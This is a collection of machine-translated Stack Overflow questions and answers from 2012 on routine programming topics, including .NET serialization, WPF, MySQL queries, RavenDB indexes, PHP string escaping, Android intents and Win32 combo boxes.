push @thrs, MCE::Hobo->create( sub { $b = $data->get_keys(1000), fib(35) } );
push @thrs, MCE::Hobo->create( sub { $b = $data->get_keys(2000), fib(35) } );
push @thrs, MCE::Hobo->create( sub { $b = $data->get_keys(3000), fib(35) } );

$_->join() for @thrs;

exit;

# Populate $self with data. When shared, the data resides under the
# shared-manager thread (via threads->create) or process (via fork).

package My::Data;

sub new {
  my $class = shift;
  my %self;

  %self = map { $_ => $_ } 1000 .. 5000;

  bless \%self, $class;
}

# Add any getter methods to suit the application. Supporting multiple
# keys helps reduce the number of trips via IPC. Serialization is
# handled automatically if getter method were to return a hash ref.
# MCE::Shared will use Serial::{Encode,Decode} if available - faster.

sub get_keys {
  my $self = shift;
  if ( wantarray ) {
    return map { $_ => $self->{$_} } @_;
  } else {
    return $self->{$_[0]};
  }
}

1; 
```

# .net - 使用 DataContractSerializer 排除控制字符

> ID：10597350
> 
> 赞同：1
> 
> 时间：2012-05-15T08:59:29.587
> 
> 标签：.net, serialization, datacontractserializer

我正在使用 DataContractSerializer 将对象列表序列化为 XML。对象属性的数据来​​自数据库，并且数据库中的列可以包含在 XML 中无效的控制字符。
是否有可能以某种方式指示 DataContractSerializer 自动排除无效的控制字符？

这是我正在使用的代码

```
serializer = new DataContractSerializer(myList.GetType());
using(var ms = new MemoryStream())
{
   serializer.WriteObject(ms, myList);
   return Encoding.UTF8.GetString(ms.ToArray());
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T08:09:55.243

我认为最简单的方法是为序列化添加一个单独的属性（它甚至可以是私有的）。在此属性中，您可以返回要序列化的字符串（不带控制字符）。

例如：

```
[DataContract]
public class MyClass 
{
    public string MyProperty { get; set; }

    [DataMember]
    private string MyPropertyForSerialization
    {
        get 
        {
            return RemoveControlCharacters(this.MyProperty);
        }
        set
        {
            this.MyProperty = value;
        }
    }
} 
```

请注意，`MyProperty`没有用属性标记 -*而是*用属性标记。`DataMember``MyPropertyForSerialization`

该代码还假定您有一个 RemoveControlCharacters 方法，该方法可以从指定的字符串中删除控制字符。

# macos - 需要苹果 Mac 开发者帐户来分发免费应用程序吗？

> ID：10597351
> 
> 赞同：0
> 
> 时间：2012-05-15T08:59:29.820
> 
> 标签：macos, app-store, account

我正在免费开发 Mac 应用程序。在 iOS 中，我们需要开发者帐户来分发以上传到 iTunes Store。在 Mac 应用程序中，是否也需要 mac 开发者帐户免费分发。Firefox 免费分发他们的应用程序，我们可以从他们的网站下载该 dmg 文件，而不是在 Mac 应用商店。

请让我知道这是需要吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:03:15.357

您需要一个开发者帐户才能将您的应用程序提交到 Apple 的任何在线商店。您要出售的价格无关紧要（即使该价格为 0 美元）。

您不需要一个人自己分发程序。

* * *

iOS 不允许安装除 Apple 在线商店外的软件。例外情况是：

*   网络应用
*   越狱的iOS设备

OS X Lion 及更早版本对可以安装的软件没有限制。

OS X Mountain Lion 将有一个用户偏好，可以限制软件安装源（包括将其限制在 Apple App Store 的最严格设置）。

# android - Android：检测用户篡改手机

> ID：10597353
> 
> 赞同：0
> 
> 时间：2012-05-15T08:59:33.297
> 
> 标签：android, button, hardware, tampering

我想检测用户何时按下睡眠安卓手机上的任何硬件按钮（或至少是家庭和电源按钮）。

到目前为止，我已经为 ACTION_SCREEN_ON 事件使用了 BroadcastReceiver，它非常有效，但是当您收到消息、电话或警报开始时也会引发它。

ACTION_USER_PRESENT 也不是选项，因为只有当用户真的在场并且知道解锁码时才会出现这种情况，因此他不会篡改手机。

有办法处理吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:12:15.237

不，这是不可能的，但这可以用于其他目的

```
public boolean onKeyUp(int keyCode, KeyEvent event) {
    if (keyCode == KeyEvent.KEYCODE_MENU) 
    {

    }
    return true;
} 
```

# wpf - VisualState 故事板适用于资源而不是控制？

> ID：10597355
> 
> 赞同：0
> 
> 时间：2012-05-15T08:59:49.697
> 
> 标签：wpf, xaml, storyboard, visualstatemanager, coloranimation

我在按钮视觉状态管理器中的情节提要有一个奇怪的问题。我有两个样式相同的按钮和一个特定的`Foreground`. 即`Path`按钮的内容将其`Fill`属性绑定到此前景。

```
<Button Style="{DynamicResource ButtonStyleListNavigation}"
        Foreground="{DynamicResource NavigationButtonForegroundBrush}">
  <Button.Content>
    <Path Data="{StaticResource LeftArrowPath}"
          Fill="{Binding RelativeSource=
                         {RelativeSource Mode=FindAncestor, AncestorType=Button},
                         Path=Foreground}" />
  </Button.Content>
</Button>

<Button Style="{DynamicResource ButtonStyleListNavigation}"
        Foreground="{DynamicResource NavigationButtonForegroundBrush}">
  <Button.Content>
    <Path Data="{StaticResource RightArrowPath}"
          Fill="{Binding RelativeSource=
                         {RelativeSource Mode=FindAncestor, AncestorType=Button},
                         Path=Foreground}" />
  </Button.Content>
</Button> 
```

在正常状态下，按钮如下所示：

![按钮正常](../Images/b75162626f329b35aefb31f97eac6a74.png)

样式`ButtonStyleListNavigation`如下：

```
<Style x:Key="ButtonStyleListNavigation" TargetType="Button">
  <Setter Property="Template">
    <Setter.Value>
      <ControlTemplate TargetType="Button">
        <Border>
          <VisualStateManager.VisualStateGroups>
            <VisualStateGroup x:Name="CommonStates">
              <VisualState x:Name="Normal"/>
              <VisualState x:Name="MouseOver">
                <Storyboard>
                  <ColorAnimationUsingKeyFrames
                            Storyboard.TargetProperty=
                                "(Control.Foreground).(SolidColorBrush.Color)">
                    <EasingColorKeyFrame KeyTime="0" Value="Chocolate" />
                  </ColorAnimationUsingKeyFrames>
                </Storyboard>
              </VisualState>
              <VisualState x:Name="Pressed" />
              <VisualState x:Name="Disabled" />
            </VisualStateGroup>
          </VisualStateManager.VisualStateGroups>

          <ContentPresenter x:Name="contentPresenter" />
        </Border>
      </ControlTemplate>
  </Setter>
</Style> 
```

所以当用户将鼠标悬停在一个按钮上时，它的颜色应该会改变，非常简单。但是，当我将鼠标悬停在*一个*按钮上时会发生以下情况：

![按钮鼠标悬停](../Images/923f63b264c401d522a9c82b034b9646.png)

**两个**按钮都会改变颜色。我显然做错了什么，但我无法弄清楚它是什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:34:56.123

您将`Foreground`两个按钮的属性设置为相同的 SolidColorBrush 实例（由 resource 给出`NavigationButtonForegroundBrush`）。然后在您的 ColorAnimation 中，您`Color`通过表达式更改 SolidColorBrush 的属性`(Control.Foreground).(SolidColorBrush.Color)`。显然，现在两个按钮都发生了`Foreground`变化。

您可以通过不将画笔用作资源而仅将其颜色用作资源来防止这种情况。因此按钮应更改为：

```
<Button Style="{DynamicResource ButtonStyleListNavigation}">
  <Button.Foreground>
    <SolidColorBrush Color="{DynamicResource NavigationButtonForegroundColor}" />
  </Button.Foreground>
  <Button.Content>
    <Path Data="{StaticResource LeftArrowPath}"
          Fill="{Binding RelativeSource=
                         {RelativeSource Mode=FindAncestor, AncestorType=Button},
                         Path=Foreground}" />
  </Button.Content>
</Button> 
```

# mysql - SELECT 语句获取最新行

> ID：10597357
> 
> 赞同：1
> 
> 时间：2012-05-15T08:59:54.823
> 
> 标签：mysql, datetime, group-by

我被指派在一个网站上做进一步的开发，目前，该网站是便利店经理监控“本周杂货袋”中的物品的网站。这位前开发人员的工作非常草率，所以每当经理们想：“该死！我需要编辑这篇文章，因为我刚刚输入了错误的值”。他们必须输入同名的新文章，然后他们有两篇同名但价格不同的文章和 DATE_TIME（输入文章的日期和时间）。数据库看起来像这样：

```
________________________________________________
|___itemId___|___price___|______date_time______|
|     1      |    2.30   | 2012-01-01 00:00:00 |
|     2      |    1.50   | 2012-01-01 00:00:00 |
|     3      |    5.99   | 2012-01-01 00:00:00 |
|     4      |    0.99   | 2012-01-01 00:00:00 |
|     4      |    2.00   | 2012-01-01 00:10:00 |
|     4      |    4.99   | 2012-01-01 00:20:00 |
|     5      |   10.00   | 2012-01-01 00:00:00 |
|     6      |   39.99   | 2012-01-01 00:00:00 | 
```

我正在处理这个**SELECT itemId, price, MAX(date_time) FROM myTable**以获取每个项目的最新行，如下所示：

```
________________________________________________
|___itemId___|___price___|______date_time______|
|     1      |    2.30   | 2012-01-01 00:00:00 |
|     2      |    1.50   | 2012-01-01 00:00:00 |
|     3      |    5.99   | 2012-01-01 00:00:00 |
|     4      |    4.99   | 2012-01-01 00:20:00 |
|     5      |   10.00   | 2012-01-01 00:00:00 |
|     6      |   39.99   | 2012-01-01 00:00:00 | 
```

但我得到的是：

```
________________________________________________
|___itemId___|___price___|______date_time______|
|     4      |    4.99   | 2012-01-01 00:20:00 | 
```

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:01:35.657

添加一个`GROUP BY`子句：

```
SELECT itemId, price, MAX(date_time)
FROM myTable 
GROUP BY itemId 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:03:49.480

尝试使用`group by`或`distinct`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:13:21.547

```
SELECT t0.itemId, 
       t0.price, 
       t0.date_time 
FROM   myTable AS t0 
       LEFT JOIN myTable AS t1 
         ON t0.itemId = t1.itemId 
            AND t1.date_time > t0.date_time 
WHERE  t1.itemId IS NULL; 
```

# c# - Raven DB：如何创建“UniqueVisitorCount by date”索引

> ID：10597359
> 
> 赞同：3
> 
> 时间：2012-05-15T09:00:06.320
> 
> 标签：c#, mapreduce, ravendb

我有一个应用程序来跟踪网站的页面访问。这是我的模型：

```
public class VisitSession {
    public string SessionId { get; set; }
    public DateTime StartTime { get; set; }
    public string UniqueVisitorId { get; set; }
    public IList<PageVisit> PageVisits { get; set; }
} 
```

当访问者访问网站时，访问会话开始。一次访问会话有许多页面访问。当访问者第一次访问该网站时，跟踪器将写入一个 UniqueVisitorId (GUID) cookie。因此，我们能够知道访问者是否是回访者。

现在，我想知道在某个日期范围内有多少**独立访问者访问了该网站。**也就是说，我想像这样在我们的网页中显示一个表格；

```
Date        | Unique Visitors Count
------------+-----------------------
2012-05-01  | 100
2012-05-02  | 1000
2012-05-03  | 120 
```

我想在 RavenDB 中创建一个索引来执行此操作。但我不知道如何编写 Map/Reduce 查询。我虽然可以是这样的：

```
public class UniqueVisitor_ByDate : AbstractIndexCreationTask<VisitSession, UniqueVisitorByDate>
{
    public UniqueVisitor_ByDate()
    {
        Map = sessions => from s in sessions
                            select new
                            {
                                s.StartTime.Date,
                                s.UniqueVisitorId
                            };

        Reduce = results => from result in results
                            group result by result.Date into g
                            select new
                            {
                                Date = g.Key,
                                UniqueVisitorCount = g.Distinct()
                            };
    }
} 
```

但它不起作用。在 Ayende 的电子书中，我知道 Map 函数的结果应该与 Reduce 函数的结果相同。那么如何编写正确的 map/reduce 函数呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:21:42.030

这个索引应该做你想做的事：

```
public class UniqueVisitor_ByDate : AbstractIndexCreationTask<VisitSession, UniqueVisitorByDate>
{
    public UniqueVisitor_ByDate()
    {
        Map = sessions => 
            from s in sessions
            select new {
                s.StartTime.Date,
                s.UniqueVisitorId,
                Count = 1,
            };

        Reduce = results =>
            from result in results
            group result by result.Date
            into g
            select new UniqueVisitorByDate {
                Date = g.Key,
                Count = g.Select(x => x.UniqueVisitorId).Distinct().Count(),
                UniqueVisitorId = g.FirstOrDefault().UniqueVisitorId,
            };
    }
} 
```

请注意，它需要“reduce”中的额外“UniqueVisitorId”属性和地图中的“count”属性，但您可以忽略这些。

# jsf-2 - p:消息附加到 ah:form

> ID：10597361
> 
> 赞同：0
> 
> 时间：2012-05-15T09:00:14.777
> 
> 标签：jsf-2, primefaces

我的页面中有两个表单，第一个公式是带有验证的输入字段，另一个是数据表。第一个公式有一个显示验证错误的消息区域，第二个公式有一个显示数据检索问题的消息区域（这个消息区域是从 myController.search 更新的）：

```
 <h:form id="form1">
        <p:message id="messageForm1" for=":form1" />
        <p:inputText id="text1" value="#{myBean.data}" required="true" />
                    ....
        <p:commandButton value="Search" actionListener"#{myController.search}"
            update=":form2:dataTable :form2:messageForm2 :form1:messageForm1" process="text1, ..." />
    </h:form>

    <h:form id="form2">
        <p:message id="messageForm2" for="messageForm2" />
        <p:dataTable>
        ...
        </p:dataTable>
    </h:form> 
```

问题是 form2 中的消息正在工作，但 form1 中的验证消息从未显示

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T10:20:38.140

标签`for`属性的描述说：`p:message`

> 要显示其消息的组件的 ID。

所以你不能指定表单的ID。您必须指定单个表单组件的 ID。例如`<p:message id="messageForm1" for="text1" />`。但是您必须为每个表单组件创建一个消息元素。

另一种方法是使用`p:messages`标签。有关示例，请参见此处： http: [//www.primefaces.org/showcase-labs/ui/messages.jsf](http://www.primefaces.org/showcase-labs/ui/messages.jsf)

# file - EXT.NET 2.0 文件上传字段浏览按钮不起作用

> ID：10597362
> 
> 赞同：1
> 
> 时间：2012-05-15T09:00:16.010
> 
> 标签：file, upload, field, ext.net

我正在尝试使用文件上传字段。我使用了 ext.net 演示站点的第一个示例。此链接：[http ://examples.ext.net/#/Form/FileUploadField/Basic/](http://examples.ext.net/#/Form/FileUploadField/Basic/)

我运行我的代码，但是当我单击浏览按钮时，窗口没有打开。我对此有所了解。我研究了这个问题。我找到了一个来源。此链接：[http](http://forums.ext.net/showthread.php?15522-CLOSED-Programmatically-click-fileuploadfield-browse) ://forums.ext.net/showthread.php?15522-CLOSED-Programmatically-click-fileuploadfield-browse 。在源弗拉基米尔说：没有办法以编程方式打开文件对话框（据我所知，IE（不确定IE9）允许它，但其他浏览器不支持它）原因：安全风险。我用的是IE9。所以我下载了IETester程序。我尝试了我的代码，但浏览按钮没有再次打开。我应该怎么办

这是代码：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Fileuploadfield.aspx.cs" 
Inherits="Fileuploadfield" %>
<%@ Register Assembly="Ext.Net" Namespace="Ext.Net" TagPrefix="ext" %>

<script type="text/javascript">
var showFile = function (fb, v) {
    if (v) {
        var el = Ext.get('fi-button-msg');
        el.update('<b>Selected:</b> ' + v);

        if (!el.isVisible()) {
            el.slideIn('t', {
                duration: .2,
                easing: 'easeIn',
                callback: function () {
                    el.highlight();
                }
            });
        } else {
            el.highlight();
        }
    }
};
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org 
/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
<form id="form1" runat="server">
    <ext:ResourceManager runat="server" ID="ResourceManager1" />
    <ext:FileUploadField ID="BasicField" runat="server" Width="400" Icon="Attach" />

        <ext:Button ID="Button1" runat="server" Text="Get File Path">
            <Listeners>
                <Click Handler="var v = #{BasicField}.getValue();  
                   Ext.Msg.alert('Selected&nbsp;File', v && v != '' ? v : 'None');" />
            </Listeners>
        </ext:Button>
</form>
</body>
</html> 
```

# android - 通过 Web 链接启动一个 android 应用程序

> ID：10597365
> 
> 赞同：1
> 
> 时间：2012-05-15T09:00:24.987
> 
> 标签：android

当单击浏览器中的 Web 链接时，我想启动我自己的应用程序。我在网上搜索了很多，解决这个问题的方法是相似的。但是我的不行。当我点击网页链接时没有任何效果 还有其他一些我没有注意到的事情吗？谁能告诉我我的申请哪里错了？谢谢

这是我的程序：

链接是：谷歌

URLApp.java：

```
public class URLApp extends Activity {
/** Called when the activity is first created. */

public void OnCreate(Bundle savedInstanceState){
    super.onCreate(savedInstanceState);

    final Intent intent = getIntent();
    final Uri uri = intent.getData();

    Log.i("++++++++++++++++++++++", uri.getScheme().toString());
}
} 
```

AndroidManifest.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.receiver"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk android:minSdkVersion="8" />
<uses-permission android:name="android.permission.INTERNET"/>

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <activity
        android:name=".URLApp"
        android:label="@string/app_name" 
        android:launchMode="singleTask">
        <intent-filter>
            <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="http"></data>
            <data android:host="www.google.com"></data>
        </intent-filter>   
    </activity>
</application>
</manifest> 
```

编辑：在我定义了自己的 URL 方案后，程序就可以工作了。我自己的网页链接是

```
<a href="myapp://test">click me!</a>
<data android:scheme="myapp"></data> 
```

为什么使用 android:scheme="http" 不起作用有没有人有同样的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:10:17.780

```
<intent-filter><action android:name="android.intent.action.VIEW"></action>
<category android:name="android.intent.category.DEFAULT"></category>
<category android:name="android.intent.category.BROWSABLE"></category>
<data android:host="www.YOUR-URL-HERE.com" android:scheme="http"></data>
</intent-filter> 
```

也许您可以删除`android:host`标签以对所有网址做出反应。

另请参阅： [Android 响应意图中的 URL](https://stackoverflow.com/questions/525063/android-respond-to-url-in-intent)

# php - mysql_real_escape_string 奇怪的撇号行为？

> ID：10597366
> 
> 赞同：0
> 
> 时间：2012-05-15T09:00:25.860
> 
> 标签：php, str-replace, mysql-real-escape-string

我有一个表格，用户输入例如（注意字符串末尾的撇号）

```
My Bday' 
```

现在，我想去掉撇号，就这么简单......不要逃避它们，不要添加斜线只是摆脱它们

首先，我有以下内容：

```
$event_title = mysql_real_escape_string($_POST['event_title']);

echo "<br /><br /><br />event title is $event_title"; 
```

这导致返回以下内容：

```
event title is My Bday\\\' 
```

为什么是3个斜线？

所以，然后我继续使用以下方法来处理这个问题：

```
$event_title = str_replace("'", "", $event_title); 

$event_title = stripslashes($event_title); 
```

然后我再次返回以检查结果

```
echo "<br /><br /><br />event title is $event_title"; 
```

我得到以下信息：

```
event title is My Bday\ 
```

任何想法发生了什么？我只是想去掉撇号和斜线，但不知何故它没有发生

顺便说一句，magic_quotes_gpc 已关闭

如果我不使用 stripslashes 因此将它们留给 MySQL 处理，我会收到以下错误：

```
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near 'Private',
event_notes = '' where user_event_id = '35'' at line 3

update user_events set event_date = '2012-11-17', event_title = 'My Bday\\\',
event_vis = 'Private', event_notes = '' where user_event_id = '35' 
```

好的，进一步编辑：

我试过这个：

```
$event_title = $_POST['event_title'];

$event_title = str_replace("'", "", $event_title);

$event_title = trim($event_title);

$event_title = mysql_real_escape_string($event_title);

echo "<br /><br /><br />event title is $event_title"; 
```

我明白了：

```
event title is My Bday\\ 
```

我只是想摆脱撇号，显然这里发生了其他事情，但它让我！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:13:19.867

发生的事情是这样的：

`mysql_real_escape_string`通过在要转义的字符前面添加斜杠来转义所有应转义的字符。但是只添加一个斜杠会导致在数据库中将字符存储为未转义，因此在插入之前必须对斜杠进行转义......

这就是为什么你有`My BDay\\\'`。如果将此值存储到数据库中，则最终结果将为`My BDay\'`.

但是当你这样做时，`str_replace("'", "", 'My BDay\\\'');`你最终会得到，`My BDay\\\`并且在调用`stripslashes`这个之后你会得到`My BDay\`- 这是绝对正确的！

所以不要担心调用后字符串的样子`mysql_real_escape_string`，只需将该值存储到数据库中，然后在检索它之后你会`My BDay'`再次得到......

**编辑**你是如何在打电话后从三个中得到一个斜线的`stripslasshes`？该函数从字符串的开头到结尾，查找任何斜线转义字符以删除转义斜线。所以它找到前两个斜线并删除一个，但仍然有两个（刚刚处理的一个和第三个），所以它处理它发现的接下来的两个斜线，这将导致只剩下一个斜线......

如果您在字符串上调用stripslashes `My BDay\\\'`- 这将导致`My BDay'`...

**EDIT2**我的错...添加了接下来的两个斜杠可能是因为您已`magic_quotes_gpc`打开 - 将其关闭或调用`mysql_real_escape_string(stripslashes($string))`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:32:39.993

在您的 php 设置中，string_splash 设置为 ON，这就是为什么当字符串从表单传递时 - 它已经被排除了......现在您使用 mysql_real_escape_string - 它也排除了“excape 字符”以及单引号。这就是为什么三个斜线..

尝试使用此功能 - 我经常使用

```
function sanitize( $value )
{
    if( get_magic_quotes_gpc() )
    {
          $value = stripslashes( $value );
    }
    //check if this function exists
    if( function_exists( "mysql_real_escape_string" ) )
    {
          $value = mysql_real_escape_string( $value );
    }
    //for PHP version < 4.3.0 use addslashes
    else
    {
          $value = addslashes( $value );
    }
    return $value;
} 
```

它不是专门针对 php 4 或更早的年份...该函数用于转义字符串并确保它不会双重转义它（这是被问到的问题）

if( function_exists( "mysql_real_escape_string" ) ) - 如果数据库连接可用，则此行转义并且

否则，如果条件确保它在数据库连接不可用并且添加 php 4 支持仅受益时可以工作...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:12:50.360

一个斜线用来逃避撇号，另一个用来逃避逃避撇号的斜线。

mysql在内部解释\'how'

# sharepoint-2007 - 使用 Javascript 访问 SharePoint 自定义列表中的超链接

> ID：10597368
> 
> 赞同：0
> 
> 时间：2012-05-15T09:00:33.230
> 
> 标签：sharepoint-2007

我有一个 SharePoint 2007 自定义列表，其中的一列是**“超链接或图片”**字段。

我的要求是，如果字段 URL 包含小于 2009 年的年份，我需要将 Url 设置为“#”。由于我们的业务需求需要小于 2009 年的所有记录都被考虑归档，因此需要删除超链接。

![在此处输入图像描述](../Images/5574b2f3a65d450c90fd77063f1cdf74.png)

如果超链接包含使用 Javascript/JQuery 的 2008，如何读取每个超链接的 URL 并将其设为“#”？自定义列表作为 Web 部件添加（附有屏幕截图）。

非常感谢您的回答。

谢谢，斯里拉姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-08T23:29:29.377

这可能会帮助您朝着正确的方向前进...

```
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js" ></script>
<script type="text/javascript">

var fieldName = "LinkField";  // Put the name of the column here

$(function(){
   var index = $("table.ms-listviewtable")
      .find("tr.ms-viewheadertr")
      .find("table[DisplayName='"+ fieldName + "']")
      .closest("th").index();

   var rows = $("table.ms-listviewtable > tbody > tr:not('.ms-viewheadertr')");

   rows.each(function(){
      var link = $(this).children("td:nth-child("+ index +")").find("a");
      var href = link.attr("href")
      if (true){
         link.attr("href", "#");
      }
   });
});

</script> 
```

# javascript - 主页设计：动态移动和扩展图像

> ID：10597372
> 
> 赞同：1
> 
> 时间：2012-05-15T09:00:42.030
> 
> 标签：javascript, jquery, html, css

我正在尝试更新我的初创公司的网站主页，但我的编程知识仅限于 HTML、CSS、一点点 jQuery，并且我正在尝试理解 HTML5（我也可以阅读~ish Javascript，但它是并不经常取得巨大成功...）！因此，我来​​找你寻求解决方案。

以下是（附图片）：

*   徽标在这里，无需触摸；）
*   我需要的是smallbox.png（上面写着一些“CAR”）在鼠标悬停时发光（我得到了smallbox_glow.png）
*   然后点击时移动到页面的中间（1）（仍然是相同的图像，上面写着汽车）
*   然后自动淡出文本，展开到大框 (2) 并获得一些不同的文本 (..about cars) 淡入。

这是不可能的吗，或者 2 行或代码可以使它工作？我有点卡在这里...

我愿意（并且有兴趣！）学习不同的编码语言，因此如有必要，请摒弃复杂性=）

图片 ：

这里：http: [//i.imgur.com/0IWzQ.png](http://i.imgur.com/0IWzQ.png)

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T03:55:01.050

我 100% 同意 Anthony 的观点……这里有一些建议可以帮助您入门。

根据您的用例

1.  我需要的是smallbox.png（上面写着一些“CAR”）在鼠标悬停时发光（我得到了smallbox_glow.png）
2.  然后点击时移动到页面的中间（1）（仍然是相同的图像，上面写着汽车）
3.  然后自动淡出文本，展开到大框 (2) 并获得一些不同的文本 (..about cars) 淡入。

一些值得思考的食物：

1.  这可以通过 CSS 单独完成，使用背景图像作为锚点，并通过 a:hover 和/或 a:active 等进行更改。如果您正在显示的是纯文本，请考虑使用“text-shadow”作为您的发光效果和用于跨平台兼容性的modernizer.js。

2.  这可以使用 HTML canvas 或[jQuery 的 animate api](http://api.jquery.com/animate/)来完成。

3.  [jQuery 提供各种淡入淡出效果](http://api.jquery.com/category/effects/)

由于我们在某些时候都是新手，所以不要羞于发布您拥有的内容，因为我们可以更好地协助解决任何问题。

祝你好运。

# javascript - 标签 香草 javascript

> ID：10597374
> 
> 赞同：0
> 
> 时间：2012-05-15T09:00:49.943
> 
> 标签：javascript, tabs

我有一个小问题，我无法从“块”组中删除选定的类。当我单击每个选项卡 X 时，它应该清除任何“块”元素上的“选定”类并应用，然后将“选定”类应用于被单击选项卡的 parentNode。

我不断收到错误消息“未捕获的类型错误：无法调用未定义的方法‘删除’”。这是 jsfiddle [http://jsfiddle.net/kas187/r4HLd/1/中的一个示例](http://jsfiddle.net/kas187/r4HLd/1/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:22:50.323

尝试：

```
window.addEventListener('DOMContentLoaded', function() {
    Array.prototype.slice.call(document.querySelectorAll('.block .tab')).forEach(function (el) {
        el.addEventListener('click', function() {
            document.querySelector('.block.selected').classList.remove('selected');
            this.parentNode.classList.add('selected');
        }, false);
    });
}, false);​ 
```

演示：http: [//jsfiddle.net/QGZvN/3/](http://jsfiddle.net/QGZvN/3/)

或者这个，如果你不喜欢*slice-method*：

```
// inside the for-block
tabbedblocks[i].querySelector('.tab').addEventListener('click', function() {
  document.querySelector('.block.selected').classList.remove('selected');
  this.parentNode.classList.add('selected');
}, false); 
```

# java - Java JAR 应用程序：结构是什么样的？（蚀）

> ID：10597375
> 
> 赞同：0
> 
> 时间：2012-05-15T09:00:51.943
> 
> 标签：java

我是一位经验丰富的 PHP 程序员，具有 Powershell、JavaScript 等方面的背景。我看到了 Java 的好处并希望深入挖掘。

尽管所有的文档对我来说都太先进了。

一个典型的 PHP 结构：

```
index.php
classes/class_get.php
classes/class_set.php 
```

在 index.php 中你会有这些行

```
require_once "classes/class_get.php";
require_once "classes/class_set.php"; 
```

现在在 Java... 我知道 Windows 文件是 .JAR 格式的。这里没问题，很容易理解。在eclipse中创建它时我很困惑。是结构；

```
Main.java
src*/defaultPackage**/myClass.java 
```

* 文件夹
** 包

您将在 Main.java 文件的哪个位置声明“import myClass.java”？

还有其他软件包，例如：

```
import java.awt.*;
import java.awt.event.*;
import java.net.URL;
import javax.swing.*; 
```

我收到错误，这个清单文件，我还没有在任何教程中听说过它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T11:21:01.887

*   a) Java 中没有 Windows 文件。Java是跨平台的。

*   b）带有斜线分隔符的东西总是一个文件夹。带点的东西总是一个包。不要混淆它们，因为它已经足够令人困惑了。

*   c) 不要使用术语“defaulPackage”，因为有这样一个术语用于案例，即您没有指定任何包。然后你的类的包被称为默认包。

> Main.java
> src*/defaultPackage**/myClass.java
> 
> 您将在 Main.java 文件的哪个位置声明“import myClass.java”？

您永远不会导入 .java，因为您导入的是类，而不是源文件。通常你在一个 jar 中只有第三方编译的类，并且没有源代码。也许。

如果您的类属于一个包，则该类的名称是整个包名。您可以从同一包中的类中省略它。

所以我们不知道 Main 和 MyClass （使用大写，如果你喜欢与其他人交流 - 否则你会混淆我们）是否属于同一个包。

如果是这样：不要导入任何东西。

Else：导入整个包名，可能包含多个点。

例如：

```
 import yourCompany.games.monstersahead.*; 
```

或者

```
 import yourCompany.games.monstersahead.MyClass; 
```

例如。

包名通常不包含文件夹名称，如 src、bin、classes。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T10:16:15.127

试试这个，这是在eclipse中创建jar或者runnable jar的方法

文件 -> 导出 -> Java -> Runnbale JAR 文件

启动配置：您的类包含公共静态 void main(String[] args)

出口目的地：目标地点

图书馆处理：

将所需的库打包到生成的 JAR 中

结束

# c++ - 组合框中的 HSCROLL 和 VSCROLL

> ID：10597382
> 
> 赞同：2
> 
> 时间：2012-05-15T09:01:08.980
> 
> 标签：c++, winapi, combobox, scrollbar, win32gui

我已经成功创建了一个组合框，`HSROLL`如下所示：

```
HWND find = CreateWindowEx(0, WC_COMBOBOX, _T(""), CBS_DROPDOWN | WS_VISIBLE | WS_CHILD |     
                           CBS_AUTOHSCROLL | WS_HSCROLL | WS_VSCROLL,0, 1, 100 30,
                           hwndToolbar, (HMENU)0, ghinst, NULL);

SendMessage(find, CB_SETHORIZONTALEXTENT, (WPARAM)1000, 0); 
```

但它也给出了`VSCROLL`，即使只有 2 个项目。这是非常丑陋的。如果我放弃`WS_VSCROLL`，它可以解决问题。

另一方面，我也使用了：

```
SendMessage(find, CB_SETMINVISIBLE, (WPARAM)20, 0); 
```

仅显示 20 个项目，其他项目由 显示`VSCROLL`。只有超过 20 个项目才会出现 VScroll 栏。所以我不能掉线`WS_VSCROLL`。

当项目较少时，您是否知道如何在没有 VSCROLL 条的情况下使用“CB_SETHORIZONTALEXTENT”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-07-05T11:26:37.480

组合框的高度似乎太小，无法容纳项目的数量。与指定的高度一样，下拉菜单中将显示尽可能多的项目。如果项目无法适应此高度，则会出现垂直滚动条。

# opengl - 渲染时处理多个通道

> ID：10597385
> 
> 赞同：1
> 
> 时间：2012-05-15T09:01:11.330
> 
> 标签：opengl, glsl

我想[`(VERSION combined with programmable pipeline and fixed pipeline)`](https://stackoverflow.com/questions/9482572/volume-rendering-using-glsl-with-ray-casting-algorithm)仅使用使用 glsl 的可编程管道（无固定管道）来渲染体积。为了实现这一点，我需要多通道渲染器，这意味着按顺序使用不同的着色器渲染不同的场景。我`three methods`想到了：

1.  使用一个着色器程序并在渲染新场景时分离着色器 -> 附加着色器 -> 重新编译程序。
